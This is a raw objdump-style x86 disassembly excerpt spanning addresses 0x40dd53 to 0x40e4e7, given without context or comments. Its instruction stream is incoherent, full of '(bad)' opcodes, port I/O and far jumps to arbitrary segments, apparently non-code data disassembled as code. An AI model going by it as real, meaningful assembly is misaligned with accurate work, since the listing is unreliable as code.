  40dd53:	or     ebx,DWORD PTR [esi+eiz*8-0x3a]
  40dd57:	hlt    
  40dd58:	(bad)  
  40dd59:	mov    cl,0xf7
  40dd5b:	push   edi
  40dd5c:	lods   eax,DWORD PTR ds:[esi]
  40dd5d:	sbb    BYTE PTR [eax],0xfe
  40dd60:	clc    
  40dd61:	lahf   
  40dd62:	xchg   edx,eax
  40dd63:	mov    al,0x68
  40dd65:	stos   BYTE PTR es:[edi],al
  40dd66:	out    dx,al
  40dd67:	out    dx,eax
  40dd68:	shl    BYTE PTR [edi-0x764d619d],cl
  40dd6e:	xchg   esi,eax
  40dd6f:	sub    edi,esi
  40dd71:	fadd   DWORD PTR [edx+0x2a]
  40dd74:	add    ch,BYTE PTR [edx+0x6e646bea]
  40dd7a:	and    al,0x15
  40dd7c:	push   ebp
  40dd7d:	adc    bh,BYTE PTR [ebp+0x12]
  40dd80:	clc    
  40dd81:	inc    edi
  40dd82:	daa    
  40dd83:	xchg   esp,eax
  40dd84:	imul   ebx,DWORD PTR [ecx+0x73],0x53
  40dd88:	xor    ecx,DWORD PTR [ebp-0x53]
  40dd8b:	adc    ebp,DWORD PTR [edx-0x5f2849d9]
  40dd91:	outs   dx,DWORD PTR ds:[esi]
  40dd92:	or     eax,0xfd23b4f4
  40dd97:	daa    
  40dd98:	iret   
  40dd99:	addr16 dec ecx
  40dd9b:	dec    ebp
  40dd9c:	mov    ?,WORD PTR [esi+ecx*4-0x75]
  40dda0:	in     eax,dx
  40dda1:	out    dx,al
  40dda2:	hlt    
  40dda3:	mov    ch,0x28
  40dda5:	in     al,dx
  40dda6:	sub    cl,BYTE PTR [ebx+0x7f3ddf65]
  40ddac:	cli    
  40ddad:	pop    edi
  40ddae:	(bad)  
  40ddaf:	adc    al,0x77
  40ddb1:	and    ch,BYTE PTR [edx]
  40ddb3:	(bad)  
  40ddb4:	cmp    eax,0x36476963
  40ddb9:	sti    
  40ddba:	pop    edi
  40ddbb:	mov    ds:0x946a1bca,al
  40ddc0:	jb     0x40ddf9
  40ddc2:	mov    ch,0x74
  40ddc4:	sub    al,0xf9
  40ddc6:	cmp    cl,BYTE PTR [eax+0x1ddfaa1d]
  40ddcc:	leave  
  40ddcd:	inc    esi
  40ddcf:	je     0x40de03
  40ddd1:	mov    esi,0x43f9f3cc
  40ddd6:	pop    ebp
  40ddd7:	fild   QWORD PTR [edi+0x76]
  40ddda:	ja     0x40de47
  40dddc:	cmp    eax,DWORD PTR [eax]
  40ddde:	bound  ecx,QWORD PTR [esi-0x2c]
  40dde1:	jg     0x40ddfa
  40dde3:	dec    edi
  40dde4:	out    dx,al
  40dde5:	mov    edx,0x9586fbfe
  40ddea:	out    0x73,al
  40ddec:	sub    BYTE PTR [edx-0x32ce9a22],al
  40ddf2:	inc    eax
  40ddf3:	aad    0xec
  40ddf5:	sub    DWORD PTR [edx-0x56497b75],0xffffff87
  40ddfc:	hlt    
  40ddfd:	cwde   
  40ddfe:	mov    al,0x73
  40de00:	lods   eax,DWORD PTR ds:[esi]
  40de01:	in     al,0x62
  40de03:	adc    edi,DWORD PTR [esi+ebx*8]
  40de06:	aam    0xba
  40de08:	scas   eax,DWORD PTR es:[edi]
  40de09:	pusha  
  40de0a:	inc    ebp
  40de0b:	mov    ecx,0x8f8c113f
  40de10:	push   cs
  40de11:	shr    bl,0x62
  40de14:	inc    ecx
  40de15:	mov    ah,0x72
  40de17:	or     DWORD PTR [esi+0x6ff8e32],edx
  40de1d:	push   0x4062f230
  40de22:	es gs mov di,0x7f66
  40de28:	js     0x40ddc4
  40de2a:	pop    eax
  40de2b:	adc    eax,0xfa02181e
  40de30:	cmp    BYTE PTR [esi],al
  40de32:	sub    DWORD PTR [esi],ebp
  40de34:	inc    edi
  40de35:	(bad)  
  40de36:	xchg   ecx,eax
  40de37:	pop    ss
  40de38:	sbb    esi,0xeeca0bfe
  40de3e:	in     al,dx
  40de3f:	sub    DWORD PTR [ebp+ebp*8-0x29737b0d],eax
  40de46:	lea    eax,[esi+ebx*4]
  40de49:	rcl    BYTE PTR [ebp+ebx*1-0x58],1
  40de4d:	jo     0x40de18
  40de4f:	jo     0x40deb6
  40de51:	and    eax,eax
  40de53:	sbb    DWORD PTR [ecx-0x63],ebx
  40de56:	repz popf 
  40de58:	cmp    eax,0xda6cf2c3
  40de5d:	mov    bl,0x21
  40de5f:	fwait
  40de60:	or     BYTE PTR [ecx],0xc2
  40de63:	popf   
  40de64:	sbb    esi,DWORD PTR [ecx-0x487c8561]
  40de6a:	(bad)  
  40de6b:	repz inc edx
  40de6d:	sub    ah,BYTE PTR [eax]
  40de6f:	push   edx
  40de70:	adc    ah,BYTE PTR ds:0x73843bd6
  40de76:	jg     0x40ddfe
  40de78:	dec    eax
  40de79:	out    0x37,al
  40de7b:	sbb    dl,BYTE PTR [ecx-0x4a]
  40de7e:	repz into 
  40de80:	xor    eax,0xd60eb965
  40de85:	or     dl,ch
  40de87:	jp     0x40ded3
  40de89:	inc    esp
  40de8a:	(bad)  
  40de8b:	out    dx,eax
  40de8c:	inc    edx
  40de8d:	mov    eax,ds:0x4c516467
  40de92:	adc    al,0x69
  40de94:	cmp    eax,0xc16cc578
  40de99:	adc    cl,BYTE PTR [eax]
  40de9b:	jno    0x40deef
  40de9d:	inc    edi
  40de9e:	popa   
  40de9f:	and    DWORD PTR [ebp+0x2b],edx
  40dea2:	sbb    bh,BYTE PTR [eax+0x1f6fd01d]
  40dea8:	out    dx,al
  40dea9:	fs ret 
  40deab:	dec    edx
  40deac:	jns    0x40df2c
  40deae:	cli    
  40deaf:	fild   WORD PTR [ebx-0xa10b603]
  40deb5:	xchg   DWORD PTR [esi+ebx*1+0x50],edx
  40deb9:	lahf   
  40deba:	or     DWORD PTR [ebp+0x7e],eax
  40debd:	into   
  40debe:	sbb    DWORD PTR [esi],ecx
  40dec0:	push   DWORD PTR [ebx]
  40dec2:	je     0x40dec2
  40dec4:	adc    DWORD PTR [edi-0x24],ebp
  40dec7:	adc    DWORD PTR [ecx],ebp
  40dec9:	shl    BYTE PTR [edi],0x10
  40decc:	sbb    DWORD PTR [ebx-0x33],eax
  40decf:	and    eax,0x480ad8d5
  40ded4:	mov    ebx,0x76546223
  40ded9:	push   ebx
  40deda:	cmp    al,0x6c
  40dedc:	fsubr  st(6),st
  40dede:	add    BYTE PTR [edi+0x2f],0x66
  40dee2:	call   0xcb89c90c
  40dee7:	mov    eax,0x1a5e3d0e
  40deec:	jns    0x40dee8
  40deee:	xor    dh,BYTE PTR [eax]
  40def0:	cmc    
  40def1:	(bad)  
  40def2:	or     DWORD PTR [ebp-0x36],eax
  40def5:	mov    bh,0xce
  40def7:	cmp    DWORD PTR [eax-0x3aad4fff],ecx
  40defd:	cmp    DWORD PTR [esi-0x71191746],edx
  40df03:	in     al,0x3a
  40df05:	jo     0x40decd
  40df07:	mov    ecx,0xdc30d600
  40df0c:	fs int 0x4
  40df0f:	jb     0x40df06
  40df11:	xchg   BYTE PTR [edi],ch
  40df13:	aam    0x6d
  40df15:	loope  0x40df96
  40df17:	cmp    al,0x7b
  40df19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df1a:	loop   0x40dee1
  40df1c:	dec    esi
  40df1d:	loopne 0x40dec7
  40df1f:	icebp  
  40df20:	xor    DWORD PTR [ebx-0x37],edx
  40df23:	or     esi,DWORD PTR ds:0xddd0d324
  40df29:	mov    esp,0xc2477531
  40df2e:	es pop esi
  40df30:	push   0x2
  40df32:	cli    
  40df33:	xor    bl,BYTE PTR [ebp+0x54]
  40df36:	leave  
  40df37:	scas   al,BYTE PTR es:[edi]
  40df38:	scas   al,BYTE PTR es:[edi]
  40df39:	les    esi,FWORD PTR [ebx-0x62cbc312]
  40df3f:	inc    ebx
  40df40:	out    dx,eax
  40df41:	mov    ch,ch
  40df43:	xchg   DWORD PTR [edi+0x28],esp
  40df46:	test   cl,bh
  40df48:	dec    esi
  40df49:	jno    0x40df49
  40df4b:	cmp    bl,al
  40df4d:	scas   al,BYTE PTR es:[edi]
  40df4e:	test   al,0x6
  40df50:	popa   
  40df51:	mov    edx,esp
  40df53:	mov    gs,WORD PTR [ecx-0x7a6f0bc4]
  40df59:	fadd   DWORD PTR [edi]
  40df5b:	(bad)  
  40df5d:	std    
  40df5e:	sbb    eax,0x9448821c
  40df63:	aad    0x3f
  40df65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df66:	daa    
  40df67:	push   esi
  40df68:	sbb    al,0x65
  40df6a:	mov    al,ds:0x819e56c0
  40df6f:	or     eax,0xe4c77cdd
  40df74:	retf   
  40df75:	ret    0xda00
  40df78:	xlat   BYTE PTR ds:[ebx]
  40df79:	dec    esp
  40df7a:	jbe    0x40df46
  40df7c:	inc    ebx
  40df7d:	sbb    ebp,ebx
  40df7f:	cli    
  40df80:	adc    edi,eax
  40df82:	inc    esi
  40df83:	jl     0x40dfa9
  40df85:	scas   eax,DWORD PTR es:[edi]
  40df86:	sar    DWORD PTR [ebx+0x71],1
  40df89:	jnp    0x40df39
  40df8b:	stc    
  40df8c:	in     al,dx
  40df8d:	mov    ds:0x303c7669,al
  40df92:	jo     0x40df9a
  40df94:	ret    0xcb95
  40df97:	jmp    0x1f53:0xeae142e3
  40df9e:	sbb    eax,0xf374a311
  40dfa3:	loopne 0x40e01b
  40dfa5:	jnp    0x40e021
  40dfa7:	into   
  40dfa8:	es scas eax,DWORD PTR es:[edi]
  40dfaa:	push   ecx
  40dfab:	sbb    eax,0x93b2ec00
  40dfb0:	adc    DWORD PTR ds:0xd43d819c,ebp
  40dfb6:	ficom  DWORD PTR [edx+ebx*1-0x31939247]
  40dfbd:	push   ebp
  40dfbe:	sub    ebx,edi
  40dfc0:	ins    DWORD PTR es:[edi],dx
  40dfc1:	mov    ah,cl
  40dfc3:	push   ecx
  40dfc4:	popa   
  40dfc5:	pusha  
  40dfc6:	xor    DWORD PTR [ebx-0x298ed7ce],0xffffffcb
  40dfcd:	xchg   DWORD PTR [edx],edx
  40dfcf:	nop
  40dfd0:	or     al,BYTE PTR [esp+edx*2-0x46]
  40dfd4:	pop    ss
  40dfd5:	ds mov dh,0x68
  40dfd8:	push   ds
  40dfd9:	pusha  
  40dfda:	or     al,0x2d
  40dfdc:	add    esi,ebx
  40dfde:	rcl    BYTE PTR [edi-0x23],0xfc
  40dfe2:	int3   
  40dfe3:	mov    esi,0x214dfb8
  40dfe8:	mov    ecx,esp
  40dfea:	in     eax,0x67
  40dfec:	nop
  40dfed:	xor    BYTE PTR [ebx],bh
  40dfef:	lock dec esp
  40dff1:	(bad)  
  40dff2:	adc    DWORD PTR [ebx-0x6fccec91],esi
  40dff8:	cs mov ecx,0xb6f49d2f
  40dffe:	dec    esp
  40dfff:	mov    BYTE PTR [ecx-0x1b],0xc5
  40e003:	mov    ebx,0xcc77816f
  40e008:	out    dx,al
  40e009:	mov    edi,0x508fee86
  40e00e:	retf   0x338
  40e011:	mov    cl,0x19
  40e013:	dec    ebp
  40e014:	ins    DWORD PTR es:[edi],dx
  40e015:	mov    ds:0xbb51814f,eax
  40e01a:	hlt    
  40e01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e01c:	pop    ecx
  40e01d:	and    al,dh
  40e01f:	out    0xe4,al
  40e021:	and    BYTE PTR [ecx+0x5a],dl
  40e024:	fld    TBYTE PTR [ebp+0x16]
  40e027:	push   esp
  40e028:	dec    ecx
  40e029:	jne    0x40e022
  40e02b:	lds    ebp,FWORD PTR [edi-0x24]
  40e02e:	(bad)  
  40e02f:	in     al,0x9f
  40e031:	add    DWORD PTR [edx*1+0x4a7c198d],ecx
  40e038:	add    bl,ah
  40e03a:	add    eax,0xd8101064
  40e03f:	test   al,0xdd
  40e041:	leave  
  40e042:	call   0xf6ffafc3
  40e047:	adc    ebx,DWORD PTR [ebx-0x7c]
  40e04a:	mov    dh,0x78
  40e04c:	sbb    dh,bh
  40e04e:	iret   
  40e04f:	iret   
  40e050:	or     eax,0xf0bc97e1
  40e055:	pop    edi
  40e056:	mov    bh,0x89
  40e058:	daa    
  40e059:	and    BYTE PTR [ebx],bh
  40e05b:	jnp    0x40e03a
  40e05d:	icebp  
  40e05e:	or     edi,edx
  40e060:	scas   al,BYTE PTR es:[edi]
  40e061:	or     ecx,edx
  40e063:	lods   eax,DWORD PTR gs:[esi]
  40e065:	adc    DWORD PTR [edi+ebx*4+0x48e0e301],ecx
  40e06c:	fs pusha 
  40e06e:	call   ebx
  40e070:	add    BYTE PTR ds:0x248c07f6,dh
  40e076:	jmp    0x40e08e
  40e078:	and    eax,0x279b93c9
  40e07d:	cmp    DWORD PTR [ebx-0x7e],esi
  40e080:	cmp    BYTE PTR [ebx-0x77],dh
  40e083:	stos   DWORD PTR es:[edi],eax
  40e084:	adc    ecx,ecx
  40e086:	in     eax,dx
  40e087:	mov    dl,0x15
  40e089:	ret    0x7eb3
  40e08c:	cmp    BYTE PTR [eax-0xe],0x5f
  40e090:	ja     0x40e01c
  40e092:	(bad)  
  40e093:	xor    eax,0x45bcdcd9
  40e098:	dec    edx
  40e099:	fbld   TBYTE PTR [ecx+0x687ce87b]
  40e09f:	cmp    BYTE PTR [eax],0x9c
  40e0a2:	sti    
  40e0a3:	aad    0xaa
  40e0a5:	or     dh,BYTE PTR [edx+0x4ddee102]
  40e0ab:	add    ebp,DWORD PTR [esi-0x65]
  40e0ae:	pop    ds
  40e0af:	sub    esi,DWORD PTR [ebp-0x72d353d4]
  40e0b5:	mov    eax,ds:0xeffafa54
  40e0ba:	daa    
  40e0bb:	push   edi
  40e0bc:	mov    DWORD PTR [edi],0x70b95500
  40e0c2:	pusha  
  40e0c3:	inc    ebx
  40e0c4:	pop    eax
  40e0c5:	(bad)  
  40e0c6:	jle    0x40e079
  40e0c8:	xor    edx,DWORD PTR [ebp+0x19]
  40e0cb:	mov    bl,0x35
  40e0cd:	in     al,dx
  40e0ce:	push   ss
  40e0cf:	jge    0x40e0d2
  40e0d1:	sbb    dl,BYTE PTR es:[esi+edi*4-0x43]
  40e0d6:	pop    esi
  40e0d7:	sbb    cl,dl
  40e0d9:	fs add eax,0x1872f33c
  40e0df:	pusha  
  40e0e0:	add    BYTE PTR [esi+0x7a],bl
  40e0e3:	out    0xae,eax
  40e0e5:	arpl   WORD PTR [ebp+0x294d9299],sp
  40e0eb:	stos   DWORD PTR es:[edi],eax
  40e0ec:	stos   DWORD PTR es:[edi],eax
  40e0ed:	sbb    eax,0x16c68a71
  40e0f2:	test   eax,0xcc2c3089
  40e0f7:	sub    eax,0xb2096b10
  40e0fc:	inc    DWORD PTR [ecx+0x43]
  40e0ff:	test   DWORD PTR [ebx-0x796f5674],edi
  40e105:	mov    al,ds:0x2b7f7046
  40e10a:	cmp    ah,BYTE PTR ds:0xde5022c7
  40e110:	dec    ebx
  40e111:	adc    ch,BYTE PTR ds:0xcfbea279
  40e117:	push   esi
  40e118:	aaa    
  40e119:	int    0xf2
  40e11b:	xchg   edi,eax
  40e11c:	retf   0x1f8e
  40e11f:	cmc    
  40e120:	dec    esi
  40e121:	popf   
  40e122:	loope  0x40e10b
  40e124:	leave  
  40e125:	dec    ebx
  40e126:	pop    ebx
  40e127:	fdivr  DWORD PTR [ecx]
  40e129:	repnz dec ebp
  40e12b:	xchg   DWORD PTR [esi+0x2d],edi
  40e12e:	fstp   DWORD PTR [ebx+0x24]
  40e131:	out    dx,eax
  40e132:	inc    esp
  40e133:	and    al,0x83
  40e135:	xor    eax,0xebb48e65
  40e13a:	adc    ebp,DWORD PTR [eax+edx*1]
  40e13d:	call   0x10d0:0x39691926
  40e144:	xchg   ebp,esp
  40e146:	xchg   esp,eax
  40e147:	pop    ebp
  40e148:	mov    BYTE PTR [edi+0x4f],dh
  40e14b:	retf   0x8bdc
  40e14e:	pop    edi
  40e14f:	push   edi
  40e150:	mov    ds:0x16d3428e,al
  40e155:	xchg   esi,eax
  40e156:	test   eax,0x1148b1df
  40e15b:	cmp    esp,edi
  40e15d:	push   cs
  40e15e:	mov    ch,0xaf
  40e160:	out    dx,al
  40e161:	das    
  40e162:	mov    dl,0x58
  40e164:	(bad)  
  40e165:	mov    ah,0x46
  40e167:	fidiv  WORD PTR [esi]
  40e169:	jno    0x40e14f
  40e16b:	in     al,0xb
  40e16d:	sar    DWORD PTR [ebx+0x3520e153],0xb0
  40e174:	jno    0x40e148
  40e176:	js     0x40e1cd
  40e178:	int3   
  40e179:	dec    ecx
  40e17a:	out    dx,eax
  40e17b:	inc    esi
  40e17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e17d:	inc    esp
  40e17e:	mov    esi,0xe8aaf999
  40e183:	in     eax,dx
  40e184:	aaa    
  40e185:	dec    edx
  40e186:	out    0x7d,eax
  40e188:	sub    al,0xda
  40e18a:	pop    ds
  40e18b:	add    al,0xd0
  40e18d:	or     DWORD PTR [ebx],0xf190613
  40e193:	lea    ebx,[eax-0x41]
  40e196:	arpl   dx,ax
  40e198:	mov    ah,0xa7
  40e19a:	push   ebx
  40e19b:	loopne 0x40e1c0
  40e19d:	xchg   esi,eax
  40e19e:	pop    esi
  40e19f:	jecxz  0x40e1a8
  40e1a1:	loope  0x40e207
  40e1a3:	popa   
  40e1a4:	test   DWORD PTR [esi+0x30],esi
  40e1a7:	test   al,0x94
  40e1a9:	add    dl,BYTE PTR [edx+0x22]
  40e1ac:	pushf  
  40e1ad:	bound  esi,QWORD PTR [edi]
  40e1af:	cmp    DWORD PTR [esi+0x27],esp
  40e1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b3:	test   BYTE PTR [eax+0x1],bl
  40e1b6:	test   BYTE PTR [ecx-0x7e5cdb87],dl
  40e1bc:	sub    esp,DWORD PTR [esi-0x7e55d0f]
  40e1c2:	ss jo  0x40e225
  40e1c5:	test   BYTE PTR [eax-0x55],bl
  40e1c8:	mov    ds:0xd27b6c1f,eax
  40e1cd:	xchg   ebp,eax
  40e1ce:	test   eax,0xc01c0d53
  40e1d3:	jp     0x40e204
  40e1d5:	aaa    
  40e1d6:	mov    ebx,0x48b19a7
  40e1db:	imul   esi,DWORD PTR [esi-0x1bf99f0e],0xf63f5abe
  40e1e5:	mov    dh,0xa7
  40e1e7:	adc    dh,BYTE PTR [ecx-0x505dff19]
  40e1ed:	mov    ah,0xfe
  40e1ef:	jne    0x40e18e
  40e1f1:	retf   
  40e1f2:	and    al,0x66
  40e1f4:	mov    eax,0x794acf69
  40e1f9:	dec    ebp
  40e1fa:	xor    BYTE PTR [edx],al
  40e1fc:	call   0xda90:0xf883e7ea
  40e203:	or     esi,0xe467af28
  40e209:	outs   dx,DWORD PTR ds:[esi]
  40e20a:	adc    eax,0xbe0fd565
  40e20f:	aam    0x4d
  40e211:	pop    esi
  40e212:	lahf   
  40e213:	xor    eax,0xe2f5018a
  40e218:	ds push esp
  40e21a:	cld    
  40e21b:	xor    eax,ebp
  40e21d:	cmp    bh,bh
  40e21f:	cmp    eax,0x5fa99e3c
  40e224:	xor    DWORD PTR ds:0x1513f05f,ebx
  40e22a:	shl    eax,0xd0
  40e22d:	popa   
  40e22e:	cwde   
  40e22f:	mov    ecx,0x652d2d39
  40e234:	jecxz  0x40e211
  40e236:	(bad)  
  40e237:	and    BYTE PTR [edx],dl
  40e239:	pop    ebp
  40e23a:	dec    edi
  40e23b:	mov    eax,0x1febf4f5
  40e240:	and    bl,BYTE PTR [eax+0x3cb18939]
  40e246:	inc    edi
  40e247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e248:	mov    edi,0xaf3bd655
  40e24d:	in     eax,0xf2
  40e24f:	inc    esp
  40e250:	addr16 cs mov edx,0x47513067
  40e257:	in     al,0xb4
  40e259:	jg     0x40e289
  40e25b:	adc    esi,esi
  40e25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e25e:	sahf   
  40e25f:	out    0x8d,eax
  40e261:	jo     0x40e259
  40e263:	jle    0x40e1ff
  40e265:	push   eax
  40e266:	xor    eax,0x61b3ca52
  40e26b:	mov    edx,0x8716a8c0
  40e270:	adc    eax,0xb8fb77d
  40e275:	(bad)  
  40e276:	in     eax,dx
  40e277:	retf   
  40e278:	bound  esp,QWORD PTR [esi+ebp*2]
  40e27b:	jg     0x40e2e4
  40e27d:	mov    esi,0xcabc315d
  40e282:	(bad)  
  40e283:	sbb    bl,BYTE PTR [edx+0x26]
  40e286:	shr    BYTE PTR [eax-0x3c2595e4],0x63
  40e28d:	and    esp,edi
  40e28f:	mov    eax,cs:0x8d505b5f
  40e295:	(bad)  
  40e296:	(bad)  
  40e297:	mov    edx,cs
  40e299:	mov    ah,0xcd
  40e29b:	outs   dx,BYTE PTR ds:[esi]
  40e29c:	mov    ch,0xd8
  40e29e:	mov    edx,0xa20e24fb
  40e2a3:	adc    DWORD PTR [esi-0x6d45d19b],edi
  40e2a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2aa:	pop    ecx
  40e2ab:	das    
  40e2ac:	scas   al,BYTE PTR es:[edi]
  40e2ad:	loope  0x40e2f4
  40e2af:	sub    eax,0xa208b9ab
  40e2b4:	into   
  40e2b5:	mov    eax,DWORD PTR [edi+0x3]
  40e2b8:	jp     0x40e2ce
  40e2ba:	pop    ds
  40e2bb:	fistp  WORD PTR [eax+eiz*8+0x4030443c]
  40e2c2:	enter  0xdc71,0xf0
  40e2c6:	add    dl,BYTE PTR [eax+edx*2+0x614bbcc5]
  40e2cd:	push   esi
  40e2ce:	addr16 nop
  40e2d0:	fild   WORD PTR [eax-0x53]
  40e2d3:	jl     0x40e281
  40e2d5:	cmp    bl,BYTE PTR [ebx]
  40e2d7:	sbb    eax,0xcb329295
  40e2dc:	inc    ebx
  40e2dd:	sahf   
  40e2de:	add    ah,BYTE PTR [esi+0x4b]
  40e2e1:	xor    al,al
  40e2e3:	push   cs
  40e2e4:	xchg   edi,eax
  40e2e5:	(bad)  
  40e2e6:	push   0x16105be3
  40e2eb:	mov    ebp,0x821d897b
  40e2f0:	shl    BYTE PTR [edi+esi*2],cl
  40e2f3:	xchg   ebx,eax
  40e2f4:	call   0x111c1e76
  40e2f9:	test   al,0x8f
  40e2fb:	add    ecx,DWORD PTR [esi]
  40e2fd:	dec    eax
  40e2fe:	(bad)  
  40e2ff:	dec    ecx
  40e300:	push   ds
  40e301:	ficom  DWORD PTR [edi-0x336c7035]
  40e307:	push   cs
  40e308:	add    DWORD PTR [ebx],ecx
  40e30a:	push   ds
  40e30b:	shl    esp,cl
  40e30d:	mov    ch,0x2a
  40e30f:	cmp    ah,BYTE PTR [ecx+0x32]
  40e312:	imul   ecx,DWORD PTR [esp+ebp*2],0x1394e890
  40e319:	sub    BYTE PTR [edi],al
  40e31b:	and    eax,0x4c928ee1
  40e320:	push   esi
  40e321:	(bad)  
  40e322:	shl    DWORD PTR [edi+0x25],cl
  40e325:	dec    ebx
  40e326:	dec    eax
  40e327:	imul   esp,DWORD PTR [ebp+edi*4-0x45],0x81f6a14c
  40e32f:	sub    BYTE PTR [eax],cl
  40e331:	add    dl,BYTE PTR [ecx-0x2d]
  40e334:	aad    0x75
  40e336:	push   ss
  40e337:	adc    esp,DWORD PTR [edi+0x398e9377]
  40e33d:	out    0xf,al
  40e33f:	mov    ds:0x4bb102d3,eax
  40e344:	enter  0xe011,0x93
  40e348:	ins    DWORD PTR es:[edi],dx
  40e349:	cmp    al,0xf1
  40e34b:	mov    al,ds:0xdfe769d4
  40e350:	or     DWORD PTR [ebx],esi
  40e352:	and    edx,DWORD PTR [ebx+0x71242f97]
  40e358:	stos   DWORD PTR es:[edi],eax
  40e359:	xchg   edx,eax
  40e35a:	aad    0x86
  40e35c:	add    BYTE PTR ds:0xb58e0822,0xfc
  40e363:	les    ecx,FWORD PTR [edx]
  40e365:	dec    edx
  40e366:	jg     0x40e320
  40e368:	and    al,0x8c
  40e36a:	in     al,0xbc
  40e36c:	push   0x1acf0736
  40e371:	sti    
  40e372:	out    0x2a,eax
  40e374:	enter  0x7fb3,0xf2
  40e378:	inc    ecx
  40e379:	push   edi
  40e37a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e37b:	in     al,dx
  40e37c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e37d:	ficomp WORD PTR [esi]
  40e37f:	rcl    DWORD PTR [edi+0x4f],1
  40e382:	lea    edi,[ecx]
  40e384:	neg    BYTE PTR [esi]
  40e386:	rcr    BYTE PTR [edx-0x3b2ee202],0xec
  40e38d:	mov    ebp,0x344da88c
  40e392:	lea    ecx,[ecx+0x7ad73999]
  40e398:	push   ds
  40e399:	inc    ecx
  40e39a:	inc    ebp
  40e39b:	jnp    0x40e3e8
  40e39d:	cs xchg ecx,eax
  40e39f:	inc    edi
  40e3a0:	jmp    0x4580:0x6a0322be
  40e3a7:	leave  
  40e3a8:	clc    
  40e3a9:	mov    ebp,0xbc7ee21f
  40e3ae:	or     al,0x4a
  40e3b0:	and    DWORD PTR [ebx+0x7a],0x15
  40e3b4:	pop    esp
  40e3b5:	cdq    
  40e3b6:	pop    es
  40e3b7:	aaa    
  40e3b8:	or     edx,esi
  40e3ba:	cmp    esp,DWORD PTR [ebp+edi*1-0x2e]
  40e3be:	pop    es
  40e3bf:	pop    ebp
  40e3c0:	scas   eax,DWORD PTR es:[edi]
  40e3c1:	ins    BYTE PTR es:[edi],dx
  40e3c2:	mov    eax,0xd6c64577
  40e3c7:	out    dx,al
  40e3c8:	and    BYTE PTR [ebp-0x29],0xd3
  40e3cc:	xchg   DWORD PTR [eax-0x2cd6f60c],eax
  40e3d2:	outs   dx,DWORD PTR ds:[esi]
  40e3d3:	mov    ds:0x79417352,al
  40e3d8:	dec    edx
  40e3d9:	jl     0x40e433
  40e3db:	jmp    0x40e36b
  40e3dd:	shl    DWORD PTR [eax],0xf1
  40e3e0:	mov    ch,0x39
  40e3e2:	sub    ah,BYTE PTR [ecx-0x2a]
  40e3e5:	and    DWORD PTR [edi],0xc341b70e
  40e3eb:	add    esp,DWORD PTR [edx]
  40e3ed:	je     0x40e3ce
  40e3ef:	bound  ecx,QWORD PTR [ebx-0x1a]
  40e3f2:	adc    eax,0x841c5c22
  40e3f7:	fcom   DWORD PTR [edx-0xe]
  40e3fa:	sub    BYTE PTR [esi],dh
  40e3fc:	mov    eax,ds:0xc78a41f6
  40e401:	rol    DWORD PTR [edx-0x12],0x30
  40e405:	stos   BYTE PTR es:[edi],al
  40e406:	jg     0x40e3b6
  40e408:	scas   eax,DWORD PTR es:[edi]
  40e409:	es (bad) 
  40e40b:	(bad)  
  40e40c:	aam    0x71
  40e40e:	mov    eax,ds:0x5774427f
  40e413:	sbb    eax,0xacaf103
  40e418:	call   0x4eb8:0xcb8d706
  40e41f:	mov    edx,0x1381ec7d
  40e424:	mov    WORD PTR [eax-0x4797fe93],es
  40e42a:	cld    
  40e42b:	mov    bh,0x7f
  40e42d:	shl    DWORD PTR [esi],0xc9
  40e430:	mov    edx,0x56c48ad8
  40e435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e436:	repz pop eax
  40e438:	imul   ebx,DWORD PTR [edi+edx*8-0x1f5effc0],0xffffff88
  40e440:	sub    BYTE PTR [ebx+0x4],ah
  40e443:	call   0xc70:0xe85334ce
  40e44a:	rol    BYTE PTR [edi+0x23dacf1e],0xb0
  40e451:	mov    ebp,0xee11c86
  40e456:	jnp    0x40e42b
  40e458:	sahf   
  40e459:	ds mov eax,0xce3a152b
  40e45f:	xor    ecx,ecx
  40e461:	das    
  40e462:	ret    0x1bd1
  40e465:	int3   
  40e466:	(bad)  
  40e467:	nop
  40e468:	fidiv  DWORD PTR [edi]
  40e46a:	xchg   edi,eax
  40e46b:	fnstcw WORD PTR [edi+0x12]
  40e46e:	push   0x34
  40e470:	stos   BYTE PTR es:[edi],al
  40e471:	scas   eax,DWORD PTR es:[edi]
  40e472:	xor    BYTE PTR [ebx+edi*2],dh
  40e475:	or     al,0x83
  40e477:	fstp   DWORD PTR [edi+0x30]
  40e47a:	(bad)  
  40e47b:	jg     0x40e48b
  40e47d:	add    esp,esi
  40e47f:	push   ebp
  40e480:	adc    al,0x33
  40e482:	mov    ch,0xf0
  40e484:	ror    DWORD PTR [edx+ecx*4+0x6297b31d],1
  40e48b:	pusha  
  40e48c:	mov    eax,ds:0xdaba842d
  40e491:	push   esp
  40e492:	mov    ah,0x61
  40e494:	inc    esi
  40e495:	mov    al,0xa9
  40e497:	bnd jp 0x40e424
  40e49a:	(bad)  
  40e49b:	es or  eax,0x940700b9
  40e4a1:	dec    edi
  40e4a2:	leave  
  40e4a3:	and    eax,0x230b121a
  40e4a8:	xor    eax,0x1f5640c6
  40e4ad:	test   bl,0x90
  40e4b0:	mov    ch,BYTE PTR [ebx-0x4656e865]
  40e4b6:	adc    eax,0xa194da7
  40e4bc:	xor    al,0xcc
  40e4be:	pop    ss
  40e4bf:	popa   
  40e4c0:	out    0xea,eax
  40e4c2:	je     0x40e44a
  40e4c4:	jmp    0x40e503
  40e4c6:	jmp    0x40e4fb
  40e4c8:	inc    esi
  40e4c9:	sar    BYTE PTR [edi-0x48],1
  40e4cc:	jae    0x40e544
  40e4ce:	jmp    0x40e537
  40e4d0:	sar    BYTE PTR [ecx+0xd],cl
  40e4d3:	sbb    al,0x3b
  40e4d5:	es or  DWORD PTR gs:[ecx+0x51],ebp
  40e4da:	popf   
  40e4db:	mov    eax,ds:0x8cd86be6
  40e4e0:	jnp    0x40e55c
  40e4e2:	inc    ebx
  40e4e3:	into   
  40e4e4:	sbb    al,BYTE PTR [ebx+esi*4]
  40e4e7:	jae    0x40e4af
